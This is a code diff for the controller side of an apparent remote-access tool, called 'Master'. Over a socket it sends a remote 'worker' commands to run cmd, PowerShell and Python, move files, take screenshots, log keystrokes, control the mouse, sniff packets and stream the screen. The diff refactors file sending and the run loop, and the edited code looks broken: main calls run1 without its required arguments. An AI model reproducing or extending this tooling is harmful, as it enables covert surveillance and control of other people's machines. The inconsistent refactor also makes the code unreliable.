@@ -12,6 +12,7 @@ import numpy as np
 
 Commend = Callable[[],bytes]
 RETURN = False
+# unneeded
 def cmd() -> bytes:
     global RETURN
     commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
@@ -19,7 +20,7 @@ def cmd() -> bytes:
     if RETURN:
         return b""
     return b"cmd:"+commend.encode()
-
+# unneeded
 def powershell()->bytes:
     global RETURN
     commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
@@ -27,7 +28,7 @@ def powershell()->bytes:
     if RETURN:
         return b""
     return b"powershell:"+commend.encode()
-
+# unneeded
 def python()->bytes:
     global RETURN
     print("enter your python code (end with an empty line) or enter \"return\" to return to menu: ")
@@ -41,13 +42,13 @@ def python()->bytes:
             return b""
         code += line + "\n"
     return b"python:"+code.encode()
-
+# unneeded
 def check_return(text:str):
     global RETURN
     if text == "return":
         RETURN = True
 
-
+# unneeded
 def receive_file() ->bytes:
     global RETURN
     file_path = input("enter the path of the file you want in the worker side or enter \"return\" to return to menu: ")
@@ -57,42 +58,28 @@ def receive_file() ->bytes:
     return b"receive_file:"+file_path.encode()
 
 
-
-def send_file() ->bytes:
-    global RETURN
-    file_path = input("enter the file path you want to send to worker or enter \"return\" to return to menu: ")
-    check_return(file_path)
-    if RETURN:
-        return b""
+def send_file(file_path:str,name:bytes) ->bytes:
     try:
         with open(file_path, "rb") as file:
             file_bytes = file.read()
-        name = input("pick a name for the file in the worker(make sure you enter file type): ")
-        check_return(name)
-        if RETURN:
-            return b""
-        while name == "" or "." not in name:
-            name = input("please enter a valid name")
-            check_return(name)
-            if RETURN:
-                return b""
-        return b"send_file:"+name.encode()+b":"+file_bytes
+        if name == b"" or b"." not in name:
+            return "error: please enter a valid name".encode()
+        return name+b":"+file_bytes
     except FileNotFoundError:
-        print(f"error: file '{file_path}' does not exist.")
-        return "return".encode()
+        return f"error: file '{file_path}' does not exist.".encode()
     except PermissionError:
-        print(f"error: file '{file_path}' is not accessible (permission issue).")
-        send_file()
+        return f"error: file '{file_path}' is not accessible (permission issue).".encode()
     except Exception as e:
-        print(f"error: {e}")
-        return "return".encode()
+        return f"error: {e}".encode()
 
+# unneeded
 def screen_shot() ->bytes:
     return b"screen_shot"
-
+# unneeded
 def exit_endless_print():
     msg = input("enter \"return\" to return to menu")
     check_return(msg)
+# unneeded
 def listen_to_keys()->bytes:
     return b"listen_to_keys"
 
@@ -137,7 +124,7 @@ def control_mouse() -> bytes:
         button = input("please enter left or right ")
     return b"control_mouse:"+x.encode()+b":"+y.encode()+b":"+button.encode()
 
-
+# unneeded
 def sniff_from_worker() ->bytes:
     print("please enter parameters(you can enter \"return\" at any time to return to menu):")
     scapy_filter = input("enter your filter for the sniffing: ")
@@ -158,7 +145,7 @@ def sniff_from_worker() ->bytes:
         scapy_amount = input("please enter a valid time  in numbers")
     return b"sniff_from_worker:" + scapy_filter.encode() + b":" + scapy_time.encode() + b":" + scapy_amount.encode()
 
-
+# unneeded
 def save_file(received:bytes):
     file_name = input("how do you want to save your file?")
     while file_name == "" or "." not in file_name:
@@ -169,13 +156,16 @@ def save_file(received:bytes):
 
 
 
+
 class Master:
-    def __init__(self, ip:str, port:int,functions:dict[str, Commend]):
+    def __init__(self, ip:str, port:int):
         self.address = (ip,port)
         self.server = socket.socket()
         self.server.bind(self.address)
         self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.functions = functions
+        self.functions: dict[str, Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
+        self.exit:bool = False
+
 
 
     def connect(self):
@@ -259,17 +249,30 @@ class Master:
         return action
 
 
-    def run(self):
+    def run2(self,function:str, message:bytes) -> bytes:
+        if function == "quit":
+            self.sender("quit".encode())
+            self.server.close()
+            self.client.close()
+            return "exited the worker".encode()
+        if function == "send_file":
+            splitted = message.decode().split(":")
+            message = send_file(splitted[0],splitted[1].encode())
+        if b"error:" in message:
+            return message
+        self.sender(function.encode()+b":"+message)
+        received = self.receiver()
+        return received
+
+    def run1(self,function:str,message:str):
         global RETURN
         self.connect()
-        function:str = self.menu()
         while function !="quit":
-            message = self.functions[function]()
             if function == "listen_to_keys":
                 t = threading.Thread(target=exit_endless_print, daemon=True)
                 t.start()
                 while not RETURN:
-                    self.sender(message)
+                    self.sender(message.encode())
                     received = self.receiver().decode()
                     if received:
                         print(received)
@@ -277,7 +280,7 @@ class Master:
                 RETURN = False
                 function = self.menu()
                 continue
-            self.sender(message)
+            self.sender(message.encode())
             if function == "live_stream":
                 self.show_stream()
                 continue
@@ -307,8 +310,8 @@ class Master:
 
 def main():
     functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
-    master = Master("10.0.0.3",5555,functions)
-    master.run()
+    master = Master("10.0.0.3",5555)
+    master.run1()
 
 if __name__ == '__main__':
     main()
